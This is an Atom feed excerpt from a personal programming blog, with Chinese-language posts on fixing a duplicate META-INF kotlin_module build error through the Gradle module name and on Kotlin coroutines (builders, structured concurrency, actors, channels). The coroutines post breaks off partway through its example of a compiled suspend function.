<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Deskid&#39;s Blog</title>
  
  <subtitle>/Life/Programing/Read/Think/Share</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://deskid.github.io/"/>
  <updated>2019-03-05T15:34:53.518Z</updated>
  <id>https://deskid.github.io/</id>
  
  <author>
    <name>deskid</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>关于 `META-INF/library_release.kotlin_module`</title>
    <link href="https://deskid.github.io/2019/03/05/about-kotlin-module/"/>
    <id>https://deskid.github.io/2019/03/05/about-kotlin-module/</id>
    <published>2019-03-05T15:27:43.000Z</published>
    <updated>2019-03-05T15:34:53.518Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">More than one file was found with OS independent path &apos;META-INF/library_release.kotlin_module&apos;</span><br></pre></td></tr></table></figure><p>最近在引入两个kotlin写的aar库时编译器报了这样的一个错误。说是打包时存在两个相同的文件，文件路径是<code>META-INF/library_release.kotlin_module</code>。</p><p>这个文件是干什么用的呢？</p><a id="more"></a><p>kotlin 支持文件级别的申明，也就是说我们可以在一个文件中申明变量、方法，而不像Java，必须有一个类。</p><p>每个 kotlin source file 会默认创建一个同样命名，但首字母大写，加了“Kt”后缀的类。</p><p>比如<code>FileExt.kt</code> 会编译成<code>FileExtKt.class</code></p><p>在Java代码中，可以通过编译后的类名访问申明在顶层的函数和变量。因此，在同一包名下，不支持两个命名相同的kotlin source文件。</p><p>通过<code>@file:JvmName(&quot;CustomName&quot;)</code>可以显式的指定一个文件编译后的类名，通过<code>@file:JvmMultifileClass</code>可以指定多个文件共享一个类名。</p><p>为了实现这个功能，kotlin专门引入了一个resource文件，用来指导kotlin的编译。</p><p>没错，这个文件就是 <code>META-INF/&lt;module_name&gt;.kotlin_module</code>.</p><p>网上有很多人解决上面的问题时，将 <code>.kotlin_module</code> 文件在打包流程中exclude，实际上这种做法是不正确的。</p><p>其实只需要保证module名字没有冲突，生成的<code>.kotlin_module</code>文件自然也就不会冲突。</p><p>在 gradle 工程中，这个文件的名字由当前工程的<code>module</code>名字 + <code>build variant</code>组成。</p><p>例如在一个 aar sdk 中，你可能会创建一个叫做 <code>library</code>的module 文件夹，<code>release</code>发布出去后，生成的aar中会带有<code>'META-INF/library_release.kotlin_module'</code>这个文件。</p><p>如果其他的工程也使用了相同的<code>module name</code>，比如另外一个aar刚好也用了<code>library</code>作为module名称，就会报上面的错误。</p><p>通过kotlinOptions可以指定moduleName名称。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">    compileSdkVersion 25</span><br><span class="line">    buildToolsVersion &quot;25.0.0&quot;</span><br><span class="line"></span><br><span class="line">    compileOptions &#123;</span><br><span class="line">        kotlinOptions.freeCompilerArgs += [&apos;-module-name&apos;, &quot;$PUBLISH_GROUP_ID.$PUBLISH_ARTIFACT_ID&quot;]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        minSdkVersion 8</span><br><span class="line">        targetSdkVersion 25</span><br><span class="line">        versionCode 1</span><br><span class="line">        versionName &quot;1.0.5&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    buildTypes &#123;</span><br><span class="line">        release &#123;</span><br><span class="line">            minifyEnabled false</span><br><span class="line">            proguardFiles getDefaultProguardFile(&apos;proguard-android.txt&apos;), &apos;proguard-rules.pro&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考文章：<br><a href="https://github.com/Takhion/android-extras-delegates/issues/1" target="_blank" rel="noopener">https://github.com/Takhion/android-extras-delegates/issues/1</a><br><a href="https://blog.jetbrains.com/kotlin/2015/09/kotlin-m13-is-out/" target="_blank" rel="noopener">https://blog.jetbrains.com/kotlin/2015/09/kotlin-m13-is-out/</a><br><a href="http://kotlinlang.org/docs/reference/java-interop.html#package-level-functions" target="_blank" rel="noopener">http://kotlinlang.org/docs/reference/java-interop.html#package-level-functions</a></p>]]></content>
    
    <summary type="html">
    
      &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;More than one file was found with OS independent path &amp;apos;META-INF/library_release.kotlin_module&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最近在引入两个kotlin写的aar库时编译器报了这样的一个错误。说是打包时存在两个相同的文件，文件路径是&lt;code&gt;META-INF/library_release.kotlin_module&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;这个文件是干什么用的呢？&lt;/p&gt;
    
    </summary>
    
      <category term="Android" scheme="https://deskid.github.io/categories/Android/"/>
    
      <category term="kotlin" scheme="https://deskid.github.io/categories/Android/kotlin/"/>
    
    
      <category term="kotlin" scheme="https://deskid.github.io/tags/kotlin/"/>
    
  </entry>
  
  <entry>
    <title>Kotlin Coroutines Guide</title>
    <link href="https://deskid.github.io/2018/11/14/kotlin_coroutines_guide/"/>
    <id>https://deskid.github.io/2018/11/14/kotlin_coroutines_guide/</id>
    <published>2018-11-14T14:40:27.000Z</published>
    <updated>2018-11-14T14:43:01.302Z</updated>
    
    <content type="html"><![CDATA[<p>本文将从以下3个方面介绍 Kotlin Coroutines</p><ul><li>概念</li><li>使用方法</li><li>内部实现原理</li></ul><p>本文的实例代码基于Kotlin 1.3.0 和 kotlinx.coroutines 1.0.0。</p><a id="more"></a><blockquote><p>众所周知，在高负荷下，阻塞和轮询是不好的。而且这个世界正在变得越来越依赖于push和异步。许多语言已经(starting with C# in 2012) 通过 async/await 关键字支持异步。 而在Kotlin, 我们抽象了这个概念，从而 一些库就可以实现各自的异步支持，所以 async 在kotlin中不再是关键字,而是一个function。</p></blockquote><blockquote><p>这个设计是为了集成各种异步API: futures/promises, callback-passing, 等等。这个设计足够抽象，甚至可以表达 lazy generators (yield) 和其他用例。</p></blockquote><p>Kotlin 团队推出 coroutines 来提供一种简单的方式来编写 concurrent 编程。 也许我们中的大多数已经在用各种基于线程的并发工具，比如 Java’s concurrency API，这已经是一套很成熟的API了。</p><h3 id="java-concurrency-vs-kotlin-coroutines">Java Concurrency vs. Kotlin Coroutines</h3><blockquote><p>如果你仍然对Java中的 <strong>threading</strong> 和 <strong>concurrency</strong> 感到困惑，我建议你阅读这本书<a href="https://www.amazon.com/gp/product/0321349601/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=0321349601&amp;linkCode=as2&amp;tag=swirtzamzncom-20&amp;linkId=c0de3483e96ad786bfda5e66d0f25284" target="_blank" rel="noopener">《Java Concurrency in Practice》</a>。</p></blockquote><p>尽管 Java’s 并发工具已经工程化的很好了, 但还是很难用。另一个问题是Java 并不鼓励非阻塞编程，所以你总是发现自己在start一个线程后才发现引入了过度开销和阻塞计算 (due to locks, sleeps, waits, etc.)。 应用 <a href="http://tutorials.jenkov.com/java-concurrency/non-blocking-algorithms.html" target="_blank" rel="noopener">non-blocking patterns</a> 很难而且极易犯错。</p><p>Kotlin 协程则相反, 背后帮程序员处理好了一堆复杂的事情，调用则显得简单，看起来像命令式编程，他们提供了不用阻塞线程就可以执行异步代码的一种方式, 对应用来说这又提供了一种新的可能。不是阻塞线程，而是<strong>suspended</strong>计算。</p><p>许多别的文章将coroutines视为“light-weight threads”; 但是coroutines不是我们Java传统意义上的线程。与线程相比, 新建一个coroutines 的代价非常廉价。一个原因是coroutines没有被映射到native的线程。正如我们将会看到的, coroutines 实际上是是被库管理着在一个线程池里面执行的。<br>另外一个很重要的不同点在于“<strong>limitation”</strong>: 线程受限于可用的native threads, coroutines 则几乎没有限制, 即使是上千个协程也可以一下子开启。</p><h3 id="concurrent-programming-style">Concurrent Programming Style</h3><p>在不同的语言中asynchronous/concurrent的实现风格往往不同：</p><ul><li>Callback-based (JavaScript)</li><li>Future/Promise-based (Java, JavaScript)</li><li>Async/Await-based (C#) and more</li></ul><p>所有的这些概念都可以用coroutines实现，kotlin没有直接依赖任何实现风格，而且，额外的一个好处是，coroutines可以像命令式编程一样序列化编写代码，尽管运行时是并发的。</p><h4 id="the-concept-of-kotlin-coroutines">The Concept of Kotlin Coroutines</h4><p><a href="https://en.wikipedia.org/wiki/Coroutine" target="_blank" rel="noopener">“Coroutine”</a> 的概念并不是新鲜事物。根据wiki，早在1958就有人提出这个概念. 许多现代编程语言也提供了native支持: C#, Go, Python, Ruby, etc. 包括Kotlin coroutines的实现在内, 都是基于<a href="https://en.wikipedia.org/wiki/Continuation" target="_blank" rel="noopener">“Continuations”</a>, Continuations 是计算机程序的状态控制的一层抽象。</p><h3 id="getting-started-with-coroutines">Getting Started with Coroutines</h3><p><a href="https://github.com/Kotlin/kotlinx.coroutines#using-in-your-projects" target="_blank" rel="noopener">reference</a><br><a href="https://github.com/s1monw1/Kotlin_Examples" target="_blank" rel="noopener">GitHub Kotlin_Examples</a></p><h4 id="kotlin-coroutines-ingredients">Kotlin Coroutines Ingredients</h4><p>正如我们提到的，kotlin提供了一套易于理解的高阶api，首先我们了解下一个新修饰符<code>suspend</code>，suspend表示一个方法是“suspending”的。</p><h3 id="suspending-functions">Suspending Functions</h3><p>在Coroutines中我们说一个方法是“suspending”的是指这个方法可能会在任何一行命令中挂起，被<code>suspend</code>修饰的方法只能在 coroutines 或者其他suspending functions中调用。</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">suspend</span> <span class="function"><span class="keyword">fun</span> <span class="title">myMethod</span><span class="params">(p: <span class="type">String</span>)</span></span>: <span class="built_in">Boolean</span> &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以把<code>coroutine</code>看做一个序列的常规方法调用，只不过这个序列执行完成后会额外提供一个运行结果。</p><h2 id="hands-on">Hands-On</h2><p>现在来看一个实际的例子</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> = runBlocking &#123; <span class="comment">//(1)</span></span><br><span class="line">    <span class="keyword">val</span> job = GlobalScope.launch &#123; <span class="comment">//(2)</span></span><br><span class="line">        <span class="keyword">val</span> result = suspendingFunction() <span class="comment">//(3)</span></span><br><span class="line">        print(<span class="string">"<span class="variable">$result</span>"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    print(<span class="string">"The result: "</span>)</span><br><span class="line">    job.join() <span class="comment">//(4)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// prints "The result: 5"</span></span><br></pre></td></tr></table></figure><p>在这个例子中，有两个新方法**(1)** <code>runBlocking</code> 、 <strong>(2)</strong> <code>launch</code>，它们都是 <strong>coroutine builders</strong>。我们可以利用各种各样的builder来实现不同的业务需求：</p><ul><li><code>launch</code> (fire and forget, can also be canceled)</li><li><code>async</code> (返回 promise)</li><li><code>runBlocking</code> (阻塞线程)</li><li>etc.</li></ul><p>我们可以在各种scopes中开启一个coroutines，在这个例子中，<code>GlobalScope</code> 被用来 <code>launch</code>一个和App拥有同样生命周期的 coroutine。这种方式仅仅用在文中的例子里，在实际应用中还是要看具体业务场合。 按照 <a href="https://medium.com/@elizarov/structured-concurrency-722d765aa952" target="_blank" rel="noopener">“structured concurrency”</a>的概念, 我们需要将coroutines限制在不同的scopes下面，从而更好的维护和管理.  <a href="https://kotlin.github.io/kotlinx.coroutines/kotlinx-coroutines-core/kotlinx.coroutines.experimental/-coroutine-scope/index.html" target="_blank" rel="noopener">CoroutineScope</a>.</p><p>接下来看这个代码做了什么：<br>由**(2)** <code>launch</code>开启的内部的coroutine是实际上干活的，我们调用**(3)** suspending function，然后coroutine打印出结果。在启动coroutine 后，主线程在coroutine结束前打印 <code>The result:</code>。 <strong>(2)</strong> <code>launch</code>返回的是一个<code>Job</code>，通过它可以取消或者**(4)** <code>join()</code>等待 coroutines 完成。由于 <code>join()</code> 可能会suspend， 所以我们需要将它包在另外一个coroutine——<code>runBlocking</code>中。<br><code>runBlocking</code> coroutine builder 被设计用来将常规的阻塞代码桥接到suspending function。这个功能常常被用在main function和 test中。<a href="https://kotlin.github.io/kotlinx.coroutines/kotlinx-coroutines-core/kotlinx.coroutines.experimental/run-blocking.html" target="_blank" rel="noopener">API</a>。如果不调用join()，那么这个程序会在coroutine打印出结果前结束掉。</p><p>在 <code>runBlocking</code> coroutine scope外 <code>launch</code>一个coroutine也是可以的。我们只需将<code>GlobalScope.launch</code> 改为 <code>launch</code>。同时，我们也可以去掉<code>join</code>因为<code>runBlocking</code>在所有的child coroutines完成前不会结束。这个例子也是 <strong>structured concurrency</strong>的一个例子, 接下来会详细介绍这个概念。</p><h3 id="structured-concurrency">Structured Concurrency</h3><p>正如之前提到的，我们可以按照某种层次结构组织管理coroutines。假设在UI界面的某一个特定事件上我们需要中断。如果我们在这个UI上开启一个 coroutines来处理某个任务, 而且当主界面中断时，这个任务也应该被中断。值得注意的是，每个coroutine都可以运行在不同的scope内。 我们可以将多个coroutines在同一个scope内管理，这样就可以同时取消。下面的例子复用了上一节的例子，只不过 <code>launch</code> coroutines 在 <code>runBlocking</code> 的scope 下。</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> &#123;</span><br><span class="line">    runBlocking &#123;</span><br><span class="line">        launch &#123;</span><br><span class="line">            delay(<span class="number">500</span>)</span><br><span class="line">            println(<span class="string">"Hello from launch"</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        println(<span class="string">"Hello from runBlocking after launch"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    println(<span class="string">"finished runBlocking"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出如下</p><blockquote><p>Hello from runBlocking after launch<br>Hello from launch<br>finished runBlocking</p></blockquote><p>从上面的输出可以看出<code>runBlocking</code> 会等待子coroutine<code>launch</code>完成。因此，我们可以利用这个结构来将coroutine的取消操作代理给子coroutines：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> &#123;</span><br><span class="line">    runBlocking &#123;</span><br><span class="line">        <span class="keyword">val</span> outerLaunch = launch &#123;</span><br><span class="line">            launch &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    delay(<span class="number">300</span>)</span><br><span class="line">                    println(<span class="string">"Hello from first inner launch"</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            launch &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    delay(<span class="number">300</span>)</span><br><span class="line">                    println(<span class="string">"Hello from second inner launch"</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        println(<span class="string">"Hello from runBlocking after outer launch"</span>)</span><br><span class="line">        delay(<span class="number">800</span>)</span><br><span class="line">        outerLaunch.cancel()</span><br><span class="line">    &#125;</span><br><span class="line">    println(<span class="string">"finished runBlocking"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出如下</p><blockquote><p>Hello from runBlocking after outer launch<br>Hello from first inner launch<br>Hello from second inner launch<br>Hello from first inner launch<br>Hello from second inner launch<br>finished runBlocking</p></blockquote><p>在这个例子中，可以看到在<code>runBlocking</code>这个scope下，<code>launch</code>先创建了一个outer coroutine，接着又创建了两个内部coroutines，当我们取消 outer coroutine时，会同时委托到inner coroutines进行cancel操作。这个机制同样适用于错误控制，如果有异常从inner coroutines内部抛出，那么同一个scope内的所有coroutines都会停止。</p><h4 id="custom-scope">Custom Scope</h4><p>这一节,我们将创建自己的<code>CoroutineScope</code>。在上个例子中我们为了简单起见，使用<code>runBlocking</code>scope，而在实际应用中创建自己管理的scope是有必要的。创建也很简单，使用 <code>coroutineScope</code> builder。文档如下:</p><blockquote><p>Creates new [CoroutineScope] and calls the specified suspend block with this scope. The provided scope inherits its [coroutineContext][CoroutineScope.coroutineContext] from the outer scope, but overrides context’s [Job]. This function is designed for a <em>parallel decomposition</em> of work. <strong>When any child coroutine in this scope fails, this scope fails, and all the rest of the children are canceled</strong> (for a different behavior see [supervisorScope]).</p></blockquote><blockquote><p>创建一个新的[CoroutineScope]并且执行这个scope内指定的suspend block。 新scope会继承外部scope的[CoroutineScope.coroutineContext]，但是会覆盖context的[Job]对象。这个方法可以用来<em>parallel decomposition</em>业务。任何child coroutines 失败，整个scope失败，并且其他的子coroutines都会被取消（如果要自定义这个行为可以使用[supervisorScope]）。</p></blockquote><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> = runBlocking &#123;</span><br><span class="line">    coroutineScope &#123;</span><br><span class="line">        <span class="keyword">val</span> outerLaunch = launch &#123;</span><br><span class="line">            launch &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    delay(<span class="number">300</span>)</span><br><span class="line">                    println(<span class="string">"Hello from first inner launch"</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            launch &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    delay(<span class="number">300</span>)</span><br><span class="line">                    println(<span class="string">"Hello from second inner launch"</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        println(<span class="string">"Hello from runBlocking after outer launch"</span>)</span><br><span class="line">        delay(<span class="number">800</span>)</span><br><span class="line">        outerLaunch.cancel()</span><br><span class="line">    &#125;</span><br><span class="line">    println(<span class="string">"finished coroutineScope"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个例子和我们之前看到的非常相似。只不过最外层的scope变成了我们自定义的scope。了解更多可以参考<a href="https://medium.com/@elizarov/structured-concurrency-722d765aa952" target="_blank" rel="noopener">this post on structured concurrency with coroutines</a>.</p><h3 id="going-deeper">Going deeper</h3><p>下面举一个更具体的例子，比如在应用中发送一封邮件。<br>请求接收者的地址和渲染消息内容是两个耗时的任务，而且互相独立。使用kotlin coroutines你可以同时执行这两个task：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">suspend</span> <span class="function"><span class="keyword">fun</span> <span class="title">sendEmail</span><span class="params">(r: <span class="type">String</span>, msg: <span class="type">String</span>)</span></span>: <span class="built_in">Boolean</span> &#123; <span class="comment">//(6)</span></span><br><span class="line">    delay(<span class="number">2000</span>)</span><br><span class="line">    println(<span class="string">"Sent '<span class="variable">$msg</span>' to <span class="variable">$r</span>"</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">suspend</span> <span class="function"><span class="keyword">fun</span> <span class="title">getReceiverAddressFromDatabase</span><span class="params">()</span></span>: String &#123; <span class="comment">//(4)</span></span><br><span class="line">    delay(<span class="number">1000</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"coroutine@kotlin.org"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">suspend</span> <span class="function"><span class="keyword">fun</span> <span class="title">sendEmailSuspending</span><span class="params">()</span></span>: <span class="built_in">Boolean</span> &#123;</span><br><span class="line">    <span class="keyword">val</span> msg = GlobalScope.async &#123; <span class="comment">//(3)</span></span><br><span class="line">        delay(<span class="number">500</span>)</span><br><span class="line">        <span class="string">"The message content"</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">val</span> recipient = GlobalScope.async &#123; </span><br><span class="line">        getReceiverAddressFromDatabase() <span class="comment">//(5)</span></span><br><span class="line">    &#125; </span><br><span class="line">    println(<span class="string">"Waiting for email data"</span>)</span><br><span class="line">    <span class="keyword">val</span> sendStatus = GlobalScope.async &#123;</span><br><span class="line">        sendEmail(recipient.await(), msg.await()) <span class="comment">//(7)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sendStatus.await() <span class="comment">//(8)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> = runBlocking &#123; <span class="comment">//(1)</span></span><br><span class="line">    <span class="keyword">val</span> job = GlobalScope.launch &#123;</span><br><span class="line">        sendEmailSuspending() <span class="comment">//(2)</span></span><br><span class="line">        println(<span class="string">"Email sent successfully."</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    job.join() <span class="comment">//(9)</span></span><br><span class="line">    println(<span class="string">"Finished"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，和之前一样，我们在<code>runBlocking</code> builder 里面起了一个**(1)** <code>launch</code> builder，这样在**(9)** 处就可以等待coroutines结束了。和这个结构一样，<strong>(2)</strong><code>sendEmailSuspending</code> suspending function也不是什么新的语法。这个方法内调用了一个**(3)** inner coroutine来获取message，同时调用另一个<code>suspend</code>方法<code>getReceiverAddressFromDatabase</code>获取发送地址。我们在**(5)** <code>async</code> built的两个单独的coroutines里同时执行这两个task。<br>注意，这里的<code>delay</code>表示的coroutines中的一种非阻塞挂起, 和<code>Thread.sleep</code>类似，这里用来模拟耗时操作。</p><h4 id="the-async-coroutine-builder">The async Coroutine Builder</h4><p><code>async</code> builder 在概念上很容易理解。在其他语言里async会返回一个<a href="https://en.wikipedia.org/wiki/Futures_and_promises" target="_blank" rel="noopener">promise</a>, 而在kotlin，则会返回<code>Deferred</code>。顺便说一下，这里的 promise, future, deferred 或者 delay 通常描述的都是同一个概念:  异步方法 <em>promises</em> 许诺会返回一个值我们可以wait或者在之后再去获取。</p><p>在**(7)<strong><code>sendEmail(recipient.await(), msg.await())</code>处返回了<code>sendStatus</code>这个<code>Deferred</code>对象，</strong>(6)** <code>sendEmail</code>调用时传入的则是之前的Deferred对象。调用<code>Deferred.await()</code>会挂起当前函数，直到返回结果可用为止。最终我们在 <strong>(8)</strong> <code>sendStatus.await()</code>处返回发送结果。</p><h2 id="shared-mutable-state">Shared Mutable State</h2><p>虽然前面没有提及，但是读者可能也想到了coroutines之间同步的问题。并发的coroutines之间会共享状态，显然和其他编程语言一样，比如Java，意识到这一点很重要。 我们可以用一些常规的策略来解决同步问题，比如 <em>thread-safe data structures</em>, <em>confining</em> execution to a <em>single thread</em> 或者 使用 <em>locks</em>.<br>除了这些常规模式, Kotlin coroutines 鼓励使用 “share by communication” (see <a href="https://kotlinexpertise.com/kotlin-coroutines-guide/#qa" target="_blank" rel="noopener">QA</a>).</p><p>实际上，我们可以使用 “actor” 来表示被多个coroutines共享的状态。Coroutines 之间可以利用actors 来发送和接收消息。</p><h3 id="actors">Actors</h3><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">sealed</span> <span class="class"><span class="keyword">class</span> <span class="title">CounterMsg</span> </span>&#123;</span><br><span class="line">    <span class="keyword">object</span> IncCounter : CounterMsg() <span class="comment">// one-way message to increment counter</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">GetCounter</span></span>(<span class="keyword">val</span> response: SendChannel&lt;<span class="built_in">Int</span>&gt;) : CounterMsg() <span class="comment">// a request with channel for reply.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">counterActor</span><span class="params">()</span></span> = GlobalScope.actor&lt;CounterMsg&gt; &#123; <span class="comment">//(1)</span></span><br><span class="line">    <span class="keyword">var</span> counter = <span class="number">0</span> <span class="comment">//(9) &lt;/b&gt;actor state, not shared</span></span><br><span class="line">    <span class="keyword">for</span> (msg <span class="keyword">in</span> channel) &#123; <span class="comment">// handle incoming messages</span></span><br><span class="line">        <span class="keyword">when</span> (msg) &#123;</span><br><span class="line">            <span class="keyword">is</span> CounterMsg.IncCounter -&gt; counter++ <span class="comment">//(4)</span></span><br><span class="line">            <span class="keyword">is</span> CounterMsg.GetCounter -&gt; msg.response.send(counter) <span class="comment">//(3)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">suspend</span> <span class="function"><span class="keyword">fun</span> <span class="title">getCurrentCount</span><span class="params">(counter: <span class="type">SendChannel</span>&lt;<span class="type">CounterMsg</span>&gt;)</span></span>: <span class="built_in">Int</span> &#123; <span class="comment">//(8)</span></span><br><span class="line">    <span class="keyword">val</span> response = Channel&lt;<span class="built_in">Int</span>&gt;() <span class="comment">//(2)</span></span><br><span class="line">    counter.send(CounterMsg.GetCounter(response))</span><br><span class="line">    <span class="keyword">val</span> receive = response.receive()</span><br><span class="line">    println(<span class="string">"Counter = <span class="variable">$receive</span>"</span>)</span><br><span class="line">    <span class="keyword">return</span> receive</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> = runBlocking&lt;<span class="built_in">Unit</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">val</span> counter = counterActor()</span><br><span class="line"></span><br><span class="line">    GlobalScope.launch &#123; <span class="comment">//(5)</span></span><br><span class="line">            <span class="keyword">while</span>(getCurrentCount(counter) &lt; <span class="number">100</span>)&#123;</span><br><span class="line">                delay(<span class="number">100</span>)</span><br><span class="line">                println(<span class="string">"sending IncCounter message"</span>)</span><br><span class="line">                counter.send(CounterMsg.IncCounter) <span class="comment">//(7)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    GlobalScope.launch &#123; <span class="comment">//(6)</span></span><br><span class="line">        <span class="keyword">while</span> ( getCurrentCount(counter) &lt; <span class="number">100</span>) &#123;</span><br><span class="line">            delay(<span class="number">200</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;.join()</span><br><span class="line">    counter.close() <span class="comment">// shutdown the actor</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个例子展示了<code>Actor</code>的使用, 实际上<code>Actor</code>本身就是一个coroutine。本例中的 actor 持有了 <strong>(9)</strong> 一个状态量 <code>counter</code>。接下来要介绍下 <strong>(2)</strong> <code>Channel</code>的概念。</p><h4 id="channels">Channels</h4><p><a href="https://github.com/Kotlin/kotlinx.coroutines/blob/master/docs/channels.md" target="_blank" rel="noopener">Channels</a> 提供了一种传递数据流的方法。和Java中的<code>BlockingQueue</code>类似 (消费者生产者pattern) ，不过Channels没有任何阻塞方法，而是提供了 <code>send</code> 和 <code>receive</code> 这两个 suspending functions 来按照<em>FIFO</em>的策略来生产和消费。</p><p>总是会有一个默认的actor和channels连接，通过这个actor可以与别的coroutines **(7)**交互。这上面的例子中，actor遍历了channel中的message，根据message的类型来决定是增加<code>counter</code>还是通过 <code>GetCounter</code>‘s <code>SendChannel</code>发送<code>counter</code> message。</p><p><code>main</code>中的第一个 coroutine 启动了一个一直向actor发送**(7)** <code>IncCounter</code> messages 的任务，直到<code>counter</code>大于100。第二个 <strong>(6)</strong> coroutine则挂起等待，直到<code>counter</code>到达100。每个coroutines都调用了suspending function <strong>(8)</strong><code>getCurrentCounter</code>, 其内部向actor发送了<code>GetCounter</code> message 并且挂起等待<code>receive</code>返回。</p><p>正如我们看到的，可变状态被限制在一个特定的actor coroutine内，并遵循了 <strong>share by communication</strong> 的原则，解决了共享可变状态的问题。</p><h3 id="more-features-and-examples">More Features and Examples</h3><p>更多文档和例子<a href="https://github.com/Kotlin/kotlinx.coroutines/tree/master/docs" target="_blank" rel="noopener">these</a>.</p><h2 id="how-it-works-implementation-of-kotlin-coroutines">How it works – Implementation of Kotlin Coroutines</h2><p>Coroutines的内部实现并不依赖于操作系统或者Java虚拟机。 与之相反，coroutines的实现机制在于编译器。编译器会将coroutines和<code>suspend</code> function转化为一个内部状态机，这个虚拟机可以维护和切换挂起的coroutines，并负责保持coroutines的内部状态。其原理来自于<a href="https://kotlinlang.org/api/latest/jvm/stdlib/kotlin.coroutines.experimental/-continuation/index.html" target="_blank" rel="noopener">Continuations</a>这个概念。 Continuations 会被编译器作为额外的一个参数传递给每个suspending function。这种技术实现也被称为<a href="https://en.wikipedia.org/wiki/Continuation-passing_style" target="_blank" rel="noopener">“Continuation-passing style”</a>。</p><p>下面我们来看下添加了continuation之后的function长什么样子。</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">suspend</span> <span class="function"><span class="keyword">fun</span> <span class="title">sampleSuspendFun</span><span class="params">(x: <span class="type">Int</span>)</span></span>: <span class="built_in">Int</span> &#123;</span><br><span class="line">    delay(<span class="number">2000</span>)</span><br><span class="line">    <span class="keyword">return</span> x * x</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过编译器转化后新方法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static final Object sampleSuspendFun(int 